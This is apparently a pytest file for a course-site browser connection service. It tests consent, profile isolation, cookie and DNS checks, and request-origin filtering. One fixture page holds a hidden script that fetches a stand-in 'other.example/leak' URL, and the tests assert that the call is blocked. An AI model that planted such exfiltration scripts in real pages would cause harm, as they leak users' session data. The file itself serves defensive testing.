"""Isolated browser connection tests. Never contact a real service."""
import socket
import time

import pytest

# Exercise dormant connection logic explicitly; shipping default stays frozen.
pytestmark = pytest.mark.usefixtures("external_inspection_enabled")
from fastapi.testclient import TestClient

from canvas_hub.boundary import HubAPI
from canvas_hub.services.site_connection import BrowserConnection, SiteConnections, _public_ip, _set_cookies
from canvas_hub.util import Conflict, InvalidInput
from canvas_hub.web.app import create_app
from .test_external_sources import source


def wait(session, predicate, timeout=10):
    end=time.monotonic()+timeout
    while time.monotonic()<end:
        s=session.snapshot()
        if predicate(s): return s
        time.sleep(.05)
    raise AssertionError(f'expected browser state; got {session.snapshot()}')


class FakeBrowser:
    def __init__(self, profile, target, domains):
        self.profile=profile; self.target=target; self.domains=domains; self.state='opening'
    def snapshot(self): return {'state':self.state,'blocked_origins':[],'pending_post':None}
    def call(self, action, arg=None, **kw):
        if action=='cancel': self.state='closed'
        return {'state':self.state}


def test_consent_and_account_site_isolation(hub, account, source):
    svc,sid,_=source; aid=account['id']; service=SiteConnections(hub,browser_factory=FakeBrowser)
    offer=service.offer(aid,sid,['https://id.example.edu/'])
    assert offer['origins']==['https://course.example.edu','https://id.example.edu']
    with pytest.raises(InvalidInput): service.start(aid,sid,offer['token'],False)
    assert not (hub.paths.browser_profiles/'external-sites').exists()
    service.start(aid,sid,offer['token'],True)
    with pytest.raises(Conflict): service.start(aid,sid,offer['token'],True)
    s=service._session(aid,sid)
    assert s.profile.is_relative_to(hub.paths.browser_profiles/'external-sites'/f'account-{aid}')
    assert not s.profile.exists()  # Fake backend; consent did not create arbitrary files.
    with pytest.raises(InvalidInput): service.offer(aid,sid,['http://id.example.edu/'])
    with pytest.raises(InvalidInput): service.offer(aid,sid,['https://id.example.edu/path'])
    service.action(aid,sid,'cancel')
    assert service.status(aid,sid)['state']=='closed'


def test_offer_cannot_be_reused_if_account_identity_changes(hub, account, source, monkeypatch):
    svc,sid,_=source; aid=account['id']; service=SiteConnections(hub,browser_factory=FakeBrowser)
    offer=service.offer(aid,sid,[])
    monkeypatch.setattr(service,'_owner',lambda _: 'a-different-account')
    with pytest.raises(Conflict): service.start(aid,sid,offer['token'],True)
    assert not (hub.paths.browser_profiles/'external-sites').exists()


def test_concurrent_browser_limit(hub, account, source):
    svc,sid,_=source; aid=account['id']; service=SiteConnections(hub,browser_factory=FakeBrowser)
    second=svc.register(aid,'https://second.example.edu/course',course_id='4242')
    third=svc.register(aid,'https://third.example.edu/course',course_id='4242')
    offers=[service.offer(aid,i,[]) for i in (sid,second,third)]
    service.start(aid,sid,offers[0]['token'],True)
    service.start(aid,second,offers[1]['token'],True)
    with pytest.raises(Conflict): service.start(aid,third,offers[2]['token'],True)
    service.action(aid,sid,'cancel')
    assert service.start(aid,third,offers[2]['token'],True)['state']=='opening'
    service.close()


def test_private_dns_and_cross_domain_cookie_are_rejected(monkeypatch):
    monkeypatch.setattr(socket,'getaddrinfo',lambda *a,**kw:[(socket.AF_INET,socket.SOCK_STREAM,6,'',('127.0.0.1',443))])
    with pytest.raises(InvalidInput): _public_ip('example.com')
    class Context:
        def __init__(self): self.added=[]
        def add_cookies(self,cookies): self.added.extend(cookies)
    context=Context()
    _set_cookies(context,'https://site.example/course/page',[
        'sid=secret; Domain=other.example; Path=/; Secure; HttpOnly',
        'ok=value; Path=/course; Secure; HttpOnly',
        'same=value; Domain=site.example; Path=/; Secure'])
    assert [x['name'] for x in context.added]==['ok','same']
    assert all('domain' not in cookie for cookie in context.added)


def test_profile_symlink_is_not_opened(tmp_path):
    base=tmp_path/'browser-profiles'; base.mkdir()
    outside=tmp_path/'other-profile'; outside.mkdir()
    (base/'external-sites').symlink_to(outside,target_is_directory=True)
    session=BrowserConnection(base/'external-sites'/'account-1'/'profile',
                              'https://course.example.edu/course',{'https://course.example.edu'},headless=True)
    assert wait(session,lambda s:s['state']=='error')['state']=='error'
    assert not list(outside.iterdir())


@pytest.mark.browser
def test_user_initiated_synthetic_login_and_expiry(tmp_path):
    requests=[]; expired=[False]
    page=(b'<main>' + b'Course lecture and assignment information. '*12 +
          b'<span hidden>HiddenSessionSecret</span><script>fetch("https://other.example/leak")</script></main>')
    def transport(url, method, headers, body):
        requests.append((url,method))
        if method=='POST':
            # This fixture covers supported non-redirect sign-in. Redirects
            # must be blocked before Chromium can bypass request interception.
            return 200, {'content-type':'text/html'}, ['session=fixture; Path=/; Secure; HttpOnly'], page
        if 'session=fixture' in headers.get('cookie','') and not expired[0]:
            return 200, {'content-type':'text/html'}, [], page
        return 200, {'content-type':'text/html'}, [], b'''<form method="post" action="/login"><input type="password" value="fixture"><button>Log in</button></form><script>document.querySelector('form').requestSubmit()</script>'''
    base=tmp_path/'browser-profiles'; base.mkdir()
    session=BrowserConnection(base/'external-sites'/'account-1'/'profile','https://course.example.edu/course',{'https://course.example.edu'},transport,headless=True)
    try:
        state=wait(session,lambda s:s['state']=='login_open' and s['pending_post'] is not None)
        assert not any(method=='POST' for _,method in requests)
        assert 'path' not in state['pending_post']
        with pytest.raises(Conflict): session.call('approve_post',{'origin':'https://evil.example','request_id':'wrong'})
        session.call('approve_post',state['pending_post'])
        session.call('retry_login')  # Explicitly reopen target, retry the synthetic login submission.
        end=time.monotonic()+5
        while time.monotonic()<end and not any(method=='POST' for _,method in requests): time.sleep(.05)
        assert sum(method=='POST' for _,method in requests)==1
        result=session.call('verify')
        assert result['state']=='content_visible' and 'Course lecture' in result['content']
        assert 'HiddenSessionSecret' not in result['content']
        assert not any('other.example' in url for url,_ in requests)
        with pytest.raises(Conflict): session.call('confirm_content','wrong')
        result=session.call('verify')
        assert session.call('confirm_content',result['review_token'])['state']=='connected'
        assert 'Course lecture' in session.call('analysis_snapshot')['content']
        expired[0]=True
        before=len(requests)
        with pytest.raises(Conflict): session.call('analysis_snapshot')
        assert session.snapshot()['state'] in ('access_unverified','reconnect_needed')
        assert requests[before:]==[('https://course.example.edu/course','GET')]
    finally:
        if session.snapshot()['state'] not in ('closed','error'): session.call('cancel')
        session.thread.join(timeout=5)
        assert not session.thread.is_alive()


def test_connection_endpoints_require_explicit_consent(hub,account,source):
    svc,sid,_=source; aid=account['id']; app=create_app(HubAPI(hub),token='fixture',port=8765)
    app.state.site_connections.browser_factory=FakeBrowser
    with TestClient(app,base_url='http://127.0.0.1:8765',headers={'Authorization':'Bearer fixture','X-Canvas-Hub':'1'}) as client:
        path=f'/api/accounts/{aid}/external-sources/{sid}/site-connection'
        offer=client.post(path+'/offer',json={'identity_origins':[]}).json()
        assert client.post(path+'/start',json={'token':offer['token']}).status_code==400
        assert client.post(path+'/start',json={'token':offer['token'],'consent':True}).json()['state']=='opening'
        assert client.post(path+'/cancel',json={}).json()['state']=='closed'


def test_route_enforces_origin_single_post_and_verification_scope():
    import threading
    from canvas_hub.services.site_connection import BrowserConnection
    class Request:
        def __init__(self,url,method='GET',kind='document',body=None,content_type='application/x-www-form-urlencoded'):
            self.url=url; self.method=method; self.resource_type=kind; self.post_data_buffer=body
            self.frame=type('Frame',(),{'url':'https://course.example.edu/course','parent_frame':None})()
            self.headers={'content-type':content_type} if method=='POST' else {}
        def all_headers(self): return self.headers
    class Route:
        def __init__(self,request): self.request=request;self.aborted=False;self.fulfilled=False
        def abort(self): self.aborted=True
        def fulfill(self,**kwargs): self.fulfilled=True
    class Context:
        def add_cookies(self,cookies): pass
    seen=[]
    def transport(url,method,headers,body):
        seen.append((url,method));return 200,{'content-type':'text/html'},[],b'ok'
    session=object.__new__(BrowserConnection)
    session.target='https://course.example.edu/course'
    session.domains={'https://course.example.edu'}
    session.lock=threading.Lock();session.state={'blocked_origins':[],'pending_post':None,'blocked_submission_origin':None}
    session._request_count=0;session._verify_mode=False;session._post_approval=None;session._post_pending=None;session.transport=transport
    other=Route(Request('https://identity.example.edu/login'))
    session._route(other,Context())
    assert other.aborted and not seen and session.snapshot()['blocked_origins']==['https://identity.example.edu']
    session.domains.add('https://identity.example.edu')
    allowed_identity=Route(Request('https://identity.example.edu/login'))
    session._route(allowed_identity,Context())
    assert allowed_identity.fulfilled and len(seen)==1
    cross_asset=Route(Request('https://identity.example.edu/asset.js',kind='script'))
    session._route(cross_asset,Context())
    assert cross_asset.aborted and len(seen)==1
    post=Route(Request('https://course.example.edu/login','POST',body=b'password=fixture'))
    session._route(post,Context())
    pending=session.snapshot()['pending_post']
    assert post.aborted and pending['origin']=='https://course.example.edu' and 'password' not in str(pending)
    session._post_approval=(*session._post_pending[:2],time.monotonic()+60)
    second=Route(Request('https://course.example.edu/login','POST',body=b'password=fixture'))
    session._route(second,Context())
    assert second.fulfilled and len(seen)==2
    third=Route(Request('https://course.example.edu/login','POST',body=b'password=fixture'))
    session._route(third,Context())
    assert third.aborted and len(seen)==2
    mutation=Route(Request('https://course.example.edu/%64elete'))
    session._route(mutation,Context())
    assert mutation.aborted
    frame=Route(Request('https://course.example.edu/course'))
    frame.request.frame.parent_frame=object()
    session._route(frame,Context())
    assert frame.aborted
    session._verify_mode=True
    script=Route(Request('https://course.example.edu/script.js',kind='script'))
    session._route(script,Context())
    assert script.aborted and len(seen)==2
